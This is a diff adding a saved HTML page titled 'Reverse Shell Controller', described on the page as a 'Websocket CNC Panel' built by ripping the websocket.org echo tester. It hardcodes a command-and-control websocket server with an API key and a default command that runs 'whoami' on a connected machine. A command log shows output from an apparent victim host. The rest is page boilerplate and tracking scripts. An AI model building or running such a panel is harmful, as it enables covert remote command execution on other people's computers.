@@ -1,0 +1,164 @@
+<!DOCTYPE html>
+<!-- saved from url=(0035)https://www.websocket.org/echo.html -->
+<html lang="en"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+		
+		<title>Reverse Shell Controller</title>
+
+		<!-- Google Fonts -->
+		<link href="Reverse%20Shell%20Controller_files/css.txt" rel="stylesheet" type="text/css">
+		<link href="Reverse%20Shell%20Controller_files/css1.txt" rel="stylesheet" type="text/css">
+
+		<!-- CSS -->
+		<link rel="stylesheet" href="Reverse%20Shell%20Controller_files/bootstrap.css" type="text/css">
+		<link rel="stylesheet" href="Reverse%20Shell%20Controller_files/shortcodes.css" type="text/css">
+		<link rel="stylesheet" href="Reverse%20Shell%20Controller_files/font-awesome.css">
+		<link rel="stylesheet" href="Reverse%20Shell%20Controller_files/animate.css" type="text/css">
+		<link rel="stylesheet" href="Reverse%20Shell%20Controller_files/style.css" type="text/css">
+		<link rel="stylesheet" href="Reverse%20Shell%20Controller_files/orange.css" type="text/css">
+		<link rel="stylesheet" href="Reverse%20Shell%20Controller_files/prettify.css" type="text/css">
+
+		<!-- Jquery -->
+		<script src="file://script.crazyegg.com/pages/scripts/0037/0800.js?451978" async="" type="text/javascript"></script><script type="text/javascript" async="" src="//tag.getdrip.com/6914321.js"></script><script src="file://script.crazyegg.com/pages/scripts/0037/0800.js?451978" async="" type="text/javascript"></script><script type="text/javascript" async="" src="//tag.getdrip.com/6914321.js"></script><script src="file://script.crazyegg.com/pages/scripts/0037/0800.js?451978" async="" type="text/javascript"></script><script type="text/javascript" async="" src="//tag.getdrip.com/6914321.js"></script><script src="file://script.crazyegg.com/pages/scripts/0037/0800.js?451978" async="" type="text/javascript"></script><script type="text/javascript" async="" src="//tag.getdrip.com/6914321.js"></script><script src="file://script.crazyegg.com/pages/scripts/0037/0800.js?451977" async="" type="text/javascript"></script><script type="text/javascript" async="" src="//tag.getdrip.com/6914321.js"></script><script src="file://script.crazyegg.com/pages/scripts/0037/0800.js?451977" async="" type="text/javascript"></script><script type="text/javascript" async="" src="//tag.getdrip.com/6914321.js"></script><script src="file://script.crazyegg.com/pages/scripts/0037/0800.js?451977" async="" type="text/javascript"></script><script type="text/javascript" async="" src="//tag.getdrip.com/6914321.js"></script><script async="" src="//www.google-analytics.com/analytics.js"></script><script src="file://script.crazyegg.com/pages/scripts/0037/0800.js?451977" async="" type="text/javascript"></script><script type="text/javascript" async="" src="//tag.getdrip.com/6914321.js"></script><script async="" src="//www.google-analytics.com/analytics.js"></script><script type="text/javascript" async="" src="Reverse%20Shell%20Controller_files/6914321.txt"></script><script async="" src="Reverse%20Shell%20Controller_files/analytics.txt"></script><script src="Reverse%20Shell%20Controller_files/0800.download" async="" type="text/javascript"></script><script type="text/javascript" src="Reverse%20Shell%20Controller_files/jquery_002.txt"></script>
+
+		<!-- HTML5 shim and Respond.js IE8 support of HTML5 elements and media queries -->
+		<!--[if lt IE 9]>
+		  <script src="js/html5shiv.min.js"></script>
+		  <script src="js/respond.min.js"></script>
+		<![endif]-->
+
+		<!-- Favicons -->
+		<link rel="icon" href="https://www.websocket.org/img/favicon.ico">
+
+		
+		<script type="text/javascript">
+		setTimeout(function(){var a=document.createElement("script");
+		var b=document.getElementsByTagName("script")[0];
+		a.src=document.location.protocol+"//script.crazyegg.com/pages/scripts/0037/0800.js?"+Math.floor(new Date().getTime()/3600000);
+		a.async=true;a.type="text/javascript";b.parentNode.insertBefore(a,b)}, 1);
+		</script>
+	<style id="fit-vids-style">.fluid-width-video-wrapper{width:100%;position:relative;padding:0;}.fluid-width-video-wrapper iframe,.fluid-width-video-wrapper object,.fluid-width-video-wrapper embed {position:absolute;top:0;left:0;width:100%;height:100%;}</style></head><body>
+
+<!-- BEGIN MENU
+================================================== -->
+
+<div id="navigation" class="navbar navbar-default navbar-fixed-top">
+	
+</div>
+<!-- END MENU
+================================================== -->
+
+
+    <script type="text/javascript" src="Reverse%20Shell%20Controller_files/stuff.txt"></script>
+
+
+
+<section id="after-intro" class="page-wrapper light-bg">
+  <div class="container">
+    <div class="row page-content article">
+      
+      <p></p>
+      
+      <div id="webSocketSupp" style="display: block;">
+          <div style="float: left;">
+            
+          </div><div class="clearfix">Websocket CNC Panel by ezydubs (Source Ripped from websocket tester)<br></div>
+        </div>
+
+        <div id="top-compat-box" style="display:none;">
+          <p>Does your browser<br>support WebSocket?</p>
+          <div id="top-compat-info-box">
+           <div id="top-compat-info">
+             <span id="browserType">Firefox 90</span><br>
+             <span id="platform">Windows</span>
+           </div>
+           <div id="top-compat-image">
+             <a href="https://www.websocket.org/echo.html"><img src="Reverse%20Shell%20Controller_files/check.png" id="wsSupportImg" alt="" width="25" height="25" border="0"></a>
+           </div>
+           <div class="clearfix"></div>
+          </div>
+          </div>
+
+        <div id="noWebSocketSupp">
+          <div style="float: left;">
+            <img src="Reverse%20Shell%20Controller_files/cross.png" width="36" height="36" align="absmiddle">
+          </div>
+          <div style="float: left; width: 600px; margin-left: 10px;">
+            <p>Uh-oh, the browser you're using doesn't have native support for WebSocket. That means you can't run this demo.</p>
+            <p>The following link lists the browsers that support WebSocket:</p>
+            <p><a href="http://caniuse.com/#feat=websockets">http://caniuse.com/#feat=websockets</a></p>
+          </div>
+          <div class="clearfix"></div>
+        </div>
+
+        <div id="echo">
+          <div id="echo-config" style="float: left;">
+            <strong>CNC Server:</strong><br>
+            <input class="draw-border" id="wsUri" size="35" value="wss://us-nyc-1.websocket.me/v3/1?api_key=9NPSwT7QEC4x62gjb8tpZQdvrdQfYO1g8vkYyZyQ&amp;notify_self" disabled="disabled">
+            <br>
+            <!-- <input class="draw-border echo-checkbox" type="checkbox" id="secureCb" onClick="toggleTls();"><br>
+            <span id="secureCbLabel" style="font-size: smaller; color: black;">Use secure WebSocket (TLS)</span><br> -->
+            <button class="echo-button" id="connect" disabled="disabled">Connect</button>
+            <button class="echo-button" id="disconnect">Disconnect</button>
+            <br>
+            <br>
+            <strong>Command:</strong><br>
+            <input class="draw-border" id="sendMessage" size="35" value="!piesocket.send(exec('whoami'))">
+            <br>
+            <button class="echo-button" id="send">Send</button>
+            <button class="echo-button" id="clearLogBut" style="position: relative; top: 0px;">Clear</button>
+          </div>
+          <div id="echo-log" style="float: left; margin-left: 20px; padding-left: 20px; width: 500px; border-left: solid 1px #cccccc;"> <strong>Command Log:</strong>
+            <div id="consoleLog" style="width: 498px; height: 151px; resize: both;"><p style="overflow-wrap: break-word;"><span style="overflow-wrap: break-word; color: blue;">!piesocket.send(exec('whoami'))</span></p><p style="overflow-wrap: break-word;"><span style="overflow-wrap: break-word; color: blue;">desktop-sslf846\userx
+
+</span></p></div>
+          </div>
+        </div>
+        <div class="clearfix"></div>
+        <br>
+    </div>
+  </div>
+</section>
+
+<script src="Reverse%20Shell%20Controller_files/echo.txt"></script>
+
+    <!-- BEGIN FOOTER
+================================================== -->
+
+<!-- END FOOTER
+================================================== -->
+
+
+<script src="Reverse%20Shell%20Controller_files/easing.txt"></script>
+<script src="Reverse%20Shell%20Controller_files/wow.txt"></script>
+<script src="Reverse%20Shell%20Controller_files/appear.txt"></script>
+<script src="Reverse%20Shell%20Controller_files/fitvids.txt"></script>
+<script src="Reverse%20Shell%20Controller_files/common.txt"></script>
+<script src="Reverse%20Shell%20Controller_files/flexslider.txt"></script>
+<script src="Reverse%20Shell%20Controller_files/countto.txt"></script>
+<script src="Reverse%20Shell%20Controller_files/jquery.txt"></script>
+<script src="Reverse%20Shell%20Controller_files/carousel.txt"></script>
+<script src="Reverse%20Shell%20Controller_files/carousel-anything.txt"></script>
+<script src="Reverse%20Shell%20Controller_files/carousel-testimonials.txt"></script>
+<script src="Reverse%20Shell%20Controller_files/isotope.txt"></script>
+<script src="Reverse%20Shell%20Controller_files/carousel-blog.txt"></script>
+<script src="Reverse%20Shell%20Controller_files/parallax.txt"></script>
+<script src="Reverse%20Shell%20Controller_files/validate.txt"></script>
+<script src="Reverse%20Shell%20Controller_files/prettify.txt"></script>
+
+
+<!-- Drip -->
+<script type="text/javascript">
+  var _dcq = _dcq || [];
+  var _dcs = _dcs || {};
+  _dcs.account = '6914321';
+
+  (function() {
+    var dc = document.createElement('script');
+    dc.type = 'text/javascript'; dc.async = true;
+    dc.src = '//tag.getdrip.com/6914321.js';
+    var s = document.getElementsByTagName('script')[0];
+    s.parentNode.insertBefore(dc, s);
+  })();
+</script>
+
+<style type="text/css"></style></body></html>
